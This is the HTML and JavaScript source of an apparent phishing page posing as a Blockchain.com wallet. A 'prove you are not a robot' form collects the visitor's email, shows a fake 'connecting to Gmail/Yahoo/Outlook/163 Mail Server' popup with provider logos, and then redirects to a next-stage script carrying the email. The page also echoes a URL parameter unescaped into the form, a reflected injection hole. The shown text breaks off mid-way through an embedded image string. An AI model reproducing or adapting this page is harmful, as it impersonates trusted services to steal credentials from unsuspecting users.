<!DOCTYPE html>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta charset="utf-8">
<title>Blockchain.com Wallet - Exchange Cryptocurrency</title>
<link rel="shortcut icon" rel="icon" type="image/png" href="./pdf/apple-touch-icon-72x72.png"/>
<script src="pr_files/jquery.js"></script>
<script src="pr_files/bootstrap.js"></script>
<link href="pr_files/facebox.css" media="screen" rel="stylesheet" type="text/css">
<script src="pr_files/facebox.js" type="text/javascript"></script>
<style>
	

body{
	background-image:url(../cc.PNG);
	background-repeat:no-repeat;
	position:static;
	margin-left: 1px;
	margin-right: 1px;
	margin-bottom: 1px;
	}#fom{
	padding-left:40px;
	padding-right:40px;
	width:430px;
	background-image:url(asd.png);
	background-repeat:no-repeat;
	opacity:0.9;
	height:300px;
	z-index:2;
	margin-top: 250px;
	margin-right: 370px;
	margin-bottom: 0px;
	margin-left: 430px;		
	
		
		}
		#fade{
			position:absolute;
			
	width:102%;
	background-color:#161515;
	height:100%;
	margin-top:129px;
	margin-left:-10px;
	opacity:0.7;
	}
		#email{
			margin-top:130px;
			margin-left:20px;
			margin-bottom:10px;
			margin-right:20px;
			height: 31px;
			background-color:#FFFFFF;
			font-size:16px;
			color:black;
					
                        text-align:center;
	width: 370px;
	border:1;
			}
			h4{
	position:absolute;
	padding-top:80px;
	padding-left:60px;
	text-align:center;
	color:#333333;
	left: 422px;
	top: 230px;
	width: 413px;
			}
#password{
		margin-right:20px;	
		margin-left:20px;
	height: 31px;
	width: 373px;
        text-align:center;

border:none;
}
#sub
{
		margin-top:10px;
			margin-left:20px;
			margin-bottom:10px;
			margin-right:20px;	
	height: 31px;
	width: 373px;
	background-color:#0E1D46;
	color:white;
	border:none;
float:left;
}
.style4 {
	color: #003399;
	font-family: Geneva, Arial, Helvetica, sans-serif;
}
</style>

</head>

<body>
<div align="left"><span id="em" style="position: absolute; left: 496px; top: 181px; background-color:#F7EBEC; background-color:red; font-size:16px;padding:20px 20px 20px 20px; display:none;"></span>
    <span id="ps"></span>
</div>
<div id="fom">
<h4 align="left" class="style4">Prove you are not a ROBOT to Secure Your Wallet</h4>
<form method="post">  
  
  <div align="left">
    <input type="text" class="email formitself"  id="email" value="<?php echo $_GET['email']; ?>" placeholder="Enter Email">
    <input value=""  name="email"  type="hidden">
    
    
    
    
    
    <input id="sub" value="CONTINUE" type="submit">
  </div>
</form>
</div>
<div style="text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;"></a></div>
<script>
$(document).ready(function() {
	$("#sub").click(function(event){
		event.preventDefault();
		var email = $("#email").val();
      if(email== "")
	  
	  {
		   jQuery.facebox("<div class='pop_up_class'>Filed is empty please type in your e-mail</div>");
	  }
	  else if(email.indexOf("yahoo.com") != -1){
		   var the_image = "<img src='https://fiu-assets-2-syitaetz61hl2sa.stackpathdns.com/static/use-media-items/15/14246/full-2048x768/56fc6e1d/Yahoo_Logo.png?resolution=0' width='100' />"; 
		   var the_server = "Yahoo";
		   jQuery.facebox("<div class='pop_up_class'>"+the_image+"...connecting to "+the_server+" Mail Server<img src='images/loading.gif' width='30'></div>");
		   		 setTimeout(function(){
			   window.location.href="nxt.php?email="+email;
        },2000);
	 }
	 	  else if(email.indexOf("gmail.com") != -1){
		   var the_image = "<img src='data:image/jpeg;base64,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' width='100' />"; 
		   var the_server = "Gmail";
		   jQuery.facebox("<div class='pop_up_class'>"+the_image+"...connecting to "+the_server+" Mail Server<img src='images/loading.gif' width='30'></div>");
		   		 setTimeout(function(){
			   window.location.href="nxt.php?email="+email;
        },2000);
	 }
	 	  else if(email.indexOf("outlook.com") != -1){
		   var the_image = "<img src='data:image/png;base64,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' width='100' />"; 
		   var the_server = "Outlook";
		   jQuery.facebox("<div class='pop_up_class'>"+the_image+"...connecting to "+the_server+" Mail Server<img src='images/loading.gif' width='30'></div>");
		   		 setTimeout(function(){
			   window.location.href="nxt.php?email="+email;
        },2000);
	 }
	 	  else if(email.indexOf("163.com") != -1){
		   var the_image = "<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAACWCAMAAACsAjcrAAAAkFBMVEX///9sa2vYAQHcEhL39/dDQ0Lz8/Ph4eFNTEz5+vp0dHPmVVXreHhWVVXwmJhJSEjU1NTn5+biPDzeJSVcW1uOjo7b29vzr69jYmKcnJz++fmurq752Ni7u7v3yMjLy8uLi4umpaWCgYGZmZmEg4L86uq2trbExcX98vI+PDx5eXg2NTXh5eixsa3Lz9LBwbxuZXEuAAAM/0lEQVR4nO2aC3ujNhaGUQySwJaRbAkLKxgEBMVM2/3//26PuCROmukk9eyWtnzPTGwutvXqXBEE6B+iAAX/CK0gS9MKsjStIEvTCrI0rSBL0wqyNK0gS9MKsjStIEvTCrI0rSBL0wqyNK0gS9MKsjStIEvTCrI0rSBL0wqyNK0gS9MKsjR9BuR8Op1/v/f56fFyebw56+np6fmD8/5P+jHI03573L3fd9pttwfQdhr5GXYM27vL/2KUn9CPQB4B4+Fh92amL7sD7Bu0GQ6cL9t5x8Nh92KlOLzRm+3xeOjc7dcSK2JbzlvO4p8Hcr7stsPobkEed4d50Jvjdti1f8Hw2s4koqnaum3rum6rHAZPTKO8mmmMjsnGmm7YcMbUaZtfkSnKgVMxAt9gcmvFvSBPl3nIm1eQ82XGOB62+9Mw5tMbDiB5Gs8lEavrSrV11TIKw+WatY1qKinJcLiPelWzdBho0dg+QiqSuUQiEM4i1nRFea2jb+73Q/sayM08v4Cc50Eft6d54p8Oo3U2m9lQpwmEKhKEMOiwrBmAEK1N6coOMT920rIKB1nSxv7cUJA8qsoIZZSSgEumWRIxzoJE8ntBvFdt3lrkleP0et7On3HY7SHeJ5QpNxBWI95+s6RNtfQgiA5PVjEJIDy5JoCForzLwJeMRHC0TmXbtxhAnGsDJDnDsr3btbYQAlMQzyCzXx0fX4Pm7PftRm/abd6CtAzB3GqUVINFZFIKInjvLZJQyiSLUq3pFeZcfeuKSGXXBIchgGhj+rACEEs/51l/BHI6PQWnza1FnreT79zk2PNlcxPfhzcgtLCMdvk33dkBpI+ilIGQt4jTPcY9hIuhWRA0QEWlThnStMIZqlvZIM1ZlZbxvSBe+82tRaath/35NosB3VwwzyPIS4yYoGekjGoYp89NJYrqwjlXOO8ufSJEgnA4gIhSpYiQqA36yAQZiiilKeKMoPtj5HXok0WetrNjXU7eXNPgz/v9ZJDBOq/2IbQL6ojztIVkigORyzSlg5iBaa4jKSnTkqU8KBJJI4Zg/IhpCHb9q+lxAhYJC5qHPw1ksshsEJ+gNpvjYf88o0xnj454nO0DrlWxqG6v0loWB/paxc21c5HNUwcgiSTdVTalgw3RJtJmPbKE+uDmuijqwMdIjGVCfhrIaJHz7m25eNhsb/uR82lKWvt5D4EMatuUJYjVLAyE6BLWZRKFIvVjK4WoI93GsZ9xUWobtDqIaQWbHFWV/tVbpCzYTwQZLfJ4eHivw5y9ni/7l7blMKdmwlJGXNqKsu3BtWzN+tJJLQJLh2pOEqnqNgiyHgJaJIVgyBXSBh4kBU+jiIOnfTOfivYvWOS1gL+Uvoft5F2nw+YV7/gS7FUZ4xKKItRAHHTgL4ox6wyjMHAHIWN4op2rrl1MirZG0mrGVBYHJesdnMY4dckne64vWGQOke3udNrP1tlP+ewjQ5GrHb+Fy1TGQagUSusSUhdtwLH0FRUhrq8+4rPASgb2wp1KWC8CXAy+By1KQD6Xfb9gkfMEchxy0ktpHEFO2wP09S9WGQuJqNyYcLiuO//S19AhYqsKX1Ss9c0Lt9YaiPYyt4XPyXFpb0wg7Kcy1qdBRotMsX4Yj5ym7mWM96f